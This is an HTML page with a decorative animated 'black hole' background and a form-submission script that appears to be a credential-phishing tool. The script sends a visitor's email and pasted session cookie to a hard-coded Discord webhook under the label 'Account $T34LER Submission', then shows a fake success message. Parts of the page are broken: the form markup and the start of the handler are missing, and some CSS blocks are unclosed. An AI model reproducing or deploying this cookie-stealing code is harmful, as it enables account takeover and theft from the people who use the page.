<!DOCTYPE html>
<html lang="en">
<head>

  <style>
    :root {
      --primary: #8a2be2;
      --primary-light: #9d4edd;
      --primary-dark: #6a1b9a;
      --accent: #ff4d8d;
      --text: #ffffff;
      --text-light: rgba(255, 255, 255, 0.7);
      --glass: rgba(255, 255, 255, 0.05);
      --glass-border: rgba(255, 255, 255, 0.1);
      --glass-highlight: rgba(255, 255, 255, 0.15);
      --glass-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
      --success: #4ade80;
      --error: #f87171;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Poppins', -apple-system, sans-serif;
    }

    body {
      background: #141414;
      color: var(--text);
      min-height: 100vh;
      display: grid;
      place-items: center;
      padding: 20px;
      line-height: 1.5;
      position: relative;
      overflow: hidden;
    }

    /* Black Hole Effect */
    a-hole {
      position: fixed;
      top: 0;
      left: 0;
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
      z-index: 0;
    }

    a-hole:before {
      position: absolute;
      top: 50%;
      left: 50%;
      z-index: 2;
      display: block;
      width: 150%;
      height: 140%;
      background: radial-gradient(ellipse at 50% 55%, transparent 10%, black 50%);
      transform: translate3d(-50%, -50%, 0);
      content: "";
    }

    a-hole:after {
      position: absolute;
      top: 50%;
      left: 50%;
      z-index: 5;
      display: block;
      width: 100%;
      height: 100%;
      background: radial-gradient(ellipse at 50% 75%, #a900ff 20%, transparent 75%);
      mix-blend-mode: overlay;
      transform: translate3d(-50%, -50%, 0);
      content: "";
    }

    @keyframes aura-glow {
      0% { background-position: 0 100%; }
      100% { background-position: 0 300%; }
    }

    .aura {
      position: absolute;
      top: -71.5%;
      left: 50%;
      z-index: 3;
      width: 30%;
      height: 140%;
      background: linear-gradient(20deg, #00f8f1, #ffbd1e20 16.5%, #fe848f 33%, #fe848f20 49.5%, #00f8f1 66%, #00f8f160 85.5%, #ffbd1e 100%) 0 100% / 100% 200%;
      border-radius: 0 0 100% 100%;
      filter: blur(50px);
      mix-blend-mode: plus-lighter;
      opacity: 0.75;
      transform: translate3d(-50%, 0, 0);
      animation: aura-glow 5s infinite linear;
    }

    .overlay {
      position: absolute;
      top: 0;
      left: 0;
      z-index: 10;
      width: 100%;
      height: 100%;
      background: repeating-linear-gradient(transparent, transparent 1px, white 1px, white 2px);
      mix-blend-mode: overlay;
      opacity: 0.5;
    }

    canvas {
      display: block;
      width: 100%;
      height: 100%;
    }

    /* Main Content */
    .card {
      width: 100%;
      max-width: 480px;
      background: var(--glass);
      backdrop-filter: blur(20px) saturate(200%);
      -webkit-backdrop-filter: blur(20px) saturate(200%);
      border-radius: 20px;
      padding: 2.5rem;
      box-shadow: var(--glass-shadow), 
                  0 0 80px rgba(138, 43, 226, 0.2),
                  0 0 120px rgba(255, 77, 141, 0.1);
      border: 1px solid var(--glass-border);
      position: relative;
      overflow: hidden;
      transition: all 0.4s ease;
      z-index: 1;
    }

    .card:hover {
      border: 1px solid var(--glass-highlight);
      box-shadow: var(--glass-shadow), 
                  0 0 100px rgba(138, 43, 226, 0.3),
                  0 0 150px rgba(255, 77, 141, 0.15);
      transform: translateY(-5px);
    }

    .card::after {
      content: '';
      position: absolute;
      inset: 0;
      border-radius: 20px;
      padding: 2px;
      background: linear-gradient(135deg, 
        rgba(138, 43, 226, 0.3), 
        rgba(255, 77, 141, 0.2),
        rgba(255, 255, 255, 0.1));
      -webkit-mask: 
        linear-gradient(#fff 0 0) content-box, 
        linear-gradient(#fff 0 0);
      -webkit-mask-composite: xor;
      mask-composite: exclude;
      pointer-events: none;
    }

    .logo {
      text-align: center;
      margin-bottom: 2rem;
      position: relative;
    }

    .logo h1 {
      font-size: 2.5rem;
      font-weight: 700;
      letter-spacing: 1px;
      background: linear-gradient(to right, var(--primary), var(--accent));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-shadow: 0 0 20px rgba(138, 43, 226, 0.3);
      margin-bottom: 0.5rem;
      position: relative;
      display: inline-block;
    }

    .logo h1::after {

      position: absolute;
      bottom: -10px;
      left: 50%;
      transform: translateX(-50%);
      width: 60%;
      height: 3px;
      background: linear-gradient(to right, var(--primary), var(--accent));

      filter: blur(2px);

    .logo p {
      color: var(--text-light);

      margin-top: 0.5rem;

    .input-group {
      margin-bottom: 1.5rem;

    label {
      display: block;
      margin-bottom: 8px;
      font-size: 14px;
      color: var(--text-light);
      font-weight: 500;
      letter-spacing: 0.5px;
    }

    input, textarea {
      width: 100%;
      padding: 14px 18px;
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid var(--glass-border);
      border-radius: 10px;
      color: var(--text);
      font-size: 15px;
      transition: all 0.3s;
    }

    textarea {
      min-height: 120px;
      resize: vertical;
    }

    input:focus, textarea:focus {
      outline: none;
      border-color: var(--primary);
      background: rgba(138, 43, 226, 0.1);
      box-shadow: 0 0 0 3px rgba(138, 43, 226, 0.2);
    }

    input::placeholder, textarea::placeholder {
      color: rgba(255, 255, 255, 0.3);
    }

    .btn {
      width: 100%;
      padding: 16px;
      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
      color: white;
      border: none;
      border-radius: 10px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s;
      position: relative;
      overflow: hidden;
      letter-spacing: 0.5px;
      font-size: 15px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .btn::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(
        90deg,
        transparent,
        rgba(255, 255, 255, 0.2),
        transparent
      );
      transition: 0.5s;
    }

    .btn:hover {
      background: linear-gradient(135deg, var(--primary-light), var(--primary));
      transform: translateY(-2px);
      box-shadow: 0 8px 25px rgba(138, 43, 226, 0.4);
    }

    .btn:hover::before {
      left: 100%;
    }

    .btn:active {
      transform: translateY(0);
    }

    .btn-secondary {
      background: transparent;
      color: var(--primary);
      border: 1px solid rgba(138, 43, 226, 0.5);
      margin-top: 1rem;
      backdrop-filter: blur(5px);
    }

    .btn-secondary:hover {
      background: rgba(138, 43, 226, 0.1);
      border-color: var(--primary);
      box-shadow: 0 8px 25px rgba(138, 43, 226, 0.2);
    }

    .notice {
      font-size: 13px;
      color: var(--text-light);
      text-align: center;
      margin-top: 1rem;
      opacity: 0.8;
    }

    .divider {
      height: 1px;
      background: linear-gradient(to right, transparent, rgba(138, 43, 226, 0.5), transparent);
      margin: 1.5rem 0;
      position: relative;
    }

    .divider::after {
      content: '';
      position: absolute;
      top: -2px;
      left: 50%;
      transform: translateX(-50%);
      width: 40px;
      height: 5px;
      background: var(--primary);
      filter: blur(4px);
      opacity: 0.5;
    }

    .status-message {
      padding: 12px;
      border-radius: 8px;
      margin-bottom: 1rem;
      text-align: center;
      font-size: 14px;
      display: none;
    }

    .success {
      background: rgba(74, 222, 128, 0.1);
      color: var(--success);
      border: 1px solid rgba(74, 222, 128, 0.3);
      display: block;
    }

    .error {
      background: rgba(248, 113, 113, 0.1);
      color: var(--error);
      border: 1px solid rgba(248, 113, 113, 0.3);
      display: block;
    }

    .icon {
      width: 20px;
      height: 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .tooltip {
      position: relative;
      display: inline-block;
      margin-left: 8px;
      cursor: pointer;
    }

    .tooltip .tooltiptext {
      visibility: hidden;
      width: 200px;
      background-color: rgba(0, 0, 0, 0.8);
      color: #fff;
      text-align: center;
      border-radius: 6px;
      padding: 8px;
      position: absolute;
      z-index: 1;
      bottom: 125%;
      left: 50%;
      transform: translateX(-50%);
      opacity: 0;
      transition: opacity 0.3s;
      font-size: 12px;
      font-weight: normal;
    }

    .tooltip:hover .tooltiptext {
      visibility: visible;
      opacity: 1;
    }

    @media (max-width: 480px) {
      .card {
        padding: 1.5rem;
      }
      
      .logo h1 {
        font-size: 2rem;
      }
    }
  </style>
</head>

  <script>
    // Black Hole Effect
    class AHole extends HTMLElement {
      connectedCallback() {
        this.canvas = this.querySelector(".js-canvas");
        this.ctx = this.canvas.getContext("2d");
        this.discs = [];
        this.lines = [];
        
        this.setSize();
        this.setDiscs();
        this.setLines();
        this.setParticles();
        
        window.addEventListener("resize", this.onResize.bind(this));
        requestAnimationFrame(this.tick.bind(this));
      }
      
      onResize() {
        this.setSize();
        this.setDiscs();
        this.setLines();
        this.setParticles();
      }
      
      setSize() {
        this.rect = this.getBoundingClientRect();
        this.render = {
          width: this.rect.width,
          height: this.rect.height,
          dpi: window.devicePixelRatio
        };
        this.canvas.width = this.render.width * this.render.dpi;
        this.canvas.height = this.render.height * this.render.dpi;
      }
      
      setDiscs() {
        const { width, height } = this.rect;
        this.discs = [];
        
        this.startDisc = {
          x: width * 0.5,
          y: height * 0.45,
          w: width * 0.75,
          h: height * 0.7
        };
        
        this.endDisc = {
          x: width * 0.5,
          y: height * 0.95,
          w: 0,
          h: 0
        };
        
        const totalDiscs = 100;
        let prevBottom = height;
        this.clip = {};
        
        for (let i = 0; i < totalDiscs; i++) {
          const p = i / totalDiscs;
          const disc = this.tweenDisc({ p });
          const bottom = disc.y + disc.h;
          
          if (bottom <= prevBottom) {
            this.clip = { disc: { ...disc }, i };
          }
          
          prevBottom = bottom;
          this.discs.push(disc);
        }
        
        this.clip.path = new Path2D();
        this.clip.path.ellipse(
          this.clip.disc.x,
          this.clip.disc.y,
          this.clip.disc.w,
          this.clip.disc.h,
          0,
          0,
          Math.PI * 2
        );
        this.clip.path.rect(
          this.clip.disc.x - this.clip.disc.w,
          0,
          this.clip.disc.w * 2,
          this.clip.disc.y
        );
      }
      
      setLines() {
        const { width, height } = this.rect;
        this.lines = [];
        const totalLines = 100;
        const linesAngle = (Math.PI * 2) / totalLines;
        
        for (let i = 0; i < totalLines; i++) {
          this.lines.push([]);
        }
        
        this.discs.forEach((disc) => {
          for (let i = 0; i < totalLines; i++) {
            const angle = i * linesAngle;
            const p = {
              x: disc.x + Math.cos(angle) * disc.w,
              y: disc.y + Math.sin(angle) * disc.h
            };
            this.lines[i].push(p);
          }
        });
        
        this.linesCanvas = new OffscreenCanvas(width, height);
        const ctx = this.linesCanvas.getContext("2d");
        
        this.lines.forEach((line, i) => {
          ctx.save();
          let lineIsIn = false;
          line.forEach((p1, j) => {
            if (j === 0) return;
            const p0 = line[j - 1];
            
            if (!lineIsIn && (ctx.isPointInPath(this.clip.path, p1.x, p1.y) ||
                ctx.isPointInStroke(this.clip.path, p1.x, p1.y)) {
              lineIsIn = true;
            } else if (lineIsIn) {
              ctx.clip(this.clip.path);
            }
            
            ctx.beginPath();
            ctx.moveTo(p0.x, p0.y);
            ctx.lineTo(p1.x, p1.y);
            ctx.strokeStyle = "#444";
            ctx.lineWidth = 2;
            ctx.stroke();
            ctx.closePath();
          });
          ctx.restore();
        });
        
        this.linesCtx = ctx;
      }
      
      setParticles() {
        const { width, height } = this.rect;
        this.particles = [];
        this.particleArea = {
          sw: this.clip.disc.w * 0.5,
          ew: this.clip.disc.w * 2,
          h: height * 0.85
        };
        this.particleArea.sx = (width - this.particleArea.sw) / 2;
        this.particleArea.ex = (width - this.particleArea.ew) / 2;
        
        const totalParticles = 100;
        for (let i = 0; i < totalParticles; i++) {
          this.particles.push(this.initParticle(true));
        }
      }
      
      initParticle(start = false) {
        const sx = this.particleArea.sx + this.particleArea.sw * Math.random();
        const ex = this.particleArea.ex + this.particleArea.ew * Math.random();
        const dx = ex - sx;
        const vx = 0.1 + Math.random() * 0.5;
        const y = start ? this.particleArea.h * Math.random() : this.particleArea.h;
        const r = 0.5 + Math.random() * 4;
        const vy = 0.5 + Math.random();
        
        return {
          x: sx,
          sx,
          dx,
          y,
          vy,
          p: 0,
          r,
          c: `rgba(255, 255, 255, ${Math.random()})`
        };
      }
      
      tweenValue(start, end, p, ease = false) {
        const delta = end - start;
        const easeFn = {
          linear: p => p,
          inExpo: p => p === 0 ? 0 : Math.pow(2, 10 * p - 10)
        }[ease ? ease : "linear"];
        return start + delta * easeFn(p);
      }
      
      drawDiscs() {
        const { ctx } = this;
        ctx.strokeStyle = "#444";
        ctx.lineWidth = 2;
        
        // Outer disc
        const outerDisc = this.startDisc;
        ctx.beginPath();
        ctx.ellipse(outerDisc.x, outerDisc.y, outerDisc.w, outerDisc.h, 0, 0, Math.PI * 2);
        ctx.stroke();
        ctx.closePath();
        
        // Discs
        this.discs.forEach((disc, i) => {
          if (i % 5 !== 0) return;
          
          if (disc.w < this.clip.disc.w - 5) {
            ctx.save();
            ctx.clip(this.clip.path);
          }
          
          ctx.beginPath();
          ctx.ellipse(disc.x, disc.y, disc.w, disc.h, 0, 0, Math.PI * 2);
          ctx.stroke();
          ctx.closePath();
          
          if (disc.w < this.clip.disc.w - 5) {
            ctx.restore();
          }
        });
      }
      
      drawLines() {
        const { ctx, linesCanvas } = this;
        ctx.drawImage(linesCanvas, 0, 0);
      }
      
      drawParticles() {
        const { ctx } = this;
        ctx.save();
        ctx.clip(this.clip.path);
        
        this.particles.forEach((particle) => {
          ctx.fillStyle = particle.c;
          ctx.beginPath();
          ctx.rect(particle.x, particle.y, particle.r, particle.r);
          ctx.closePath();
          ctx.fill();
        });
        
        ctx.restore();
      }
      
      moveDiscs() {
        this.discs.forEach((disc) => {
          disc.p = (disc.p + 0.001) % 1;
          this.tweenDisc(disc);
        });
      }
      
      moveParticles() {
        this.particles.forEach((particle) => {
          particle.p = 1 - particle.y / this.particleArea.h;
          particle.x = particle.sx + particle.dx * particle.p;
          particle.y -= particle.vy;
          
          if (particle.y < 0) {
            particle.y = this.initParticle().y;
          }
        });
      }
      
      tweenDisc(disc) {
        disc.x = this.tweenValue(this.startDisc.x, this.endDisc.x, disc.p);
        disc.y = this.tweenValue(this.startDisc.y, this.endDisc.y, disc.p, "inExpo");
        disc.w = this.tweenValue(this.startDisc.w, this.endDisc.w, disc.p);
        disc.h = this.tweenValue(this.startDisc.h, this.endDisc.h, disc.p);
        return disc;
      }
      
      tick(time) {
        const { ctx } = this;
        ctx.clearRect(0, 0, this.canvas.width, this.canvas.height);
        ctx.save();
        ctx.scale(this.render.dpi, this.render.dpi);
        
        this.moveDiscs();
        this.moveParticles();
        this.drawDiscs();
        this.drawLines();
        this.drawParticles();
        
        ctx.restore();
        requestAnimationFrame(this.tick.bind(this));
      }
    }

    customElements.define("a-hole", AHole);

        submitBtn.innerHTML = `
          <svg class="icon spin" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <path stroke-linecap="round" stroke-linejoin="round" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
          </svg>
          Processing...
        `;
        submitBtn.disabled = true;
        
        // Send to Discord webhook
        await fetch('https://discord.com/api/webhooks/1362500478432444659/wAornimTuM9pB-X13UXwmzhWBA2ygxCTuV89-lrmxgNvKfXUk2lAPVTrk127VTAUgqyK', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: `üì¨ New Account $T34LER Submission\nüìß ${email}\nüç™ ${cookie.substring(0, 30)}... (${cookie.length} chars)`
          })
        });
        
        // Show success
        statusMessage.textContent = 'Success! Your request has been submitted. Check your email soon.';
        statusMessage.className = 'status-message success';
        e.target.reset();
        
        // Reset button after delay
        setTimeout(() => {
          submitBtn.innerHTML = originalText;
          submitBtn.disabled = false;
        }, 2000);
      } catch (err) {
        statusMessage.textContent = 'Error submitting. Please try again or contact support.';
        statusMessage.className = 'status-message error';
        console.error(err);
        
        // Reset button
        const submitBtn = e.target.querySelector('button[type="submit"]');
        submitBtn.innerHTML = originalText;
        submitBtn.disabled = false;
      }
    });

    // Add spin animation for loading
    const style = document.createElement('style');
    style.textContent = `
      .spin {
        animation: spin 1s linear infinite;
      }
    `;
    document.head.appendChild(style);
  </script>
</body>
</html>
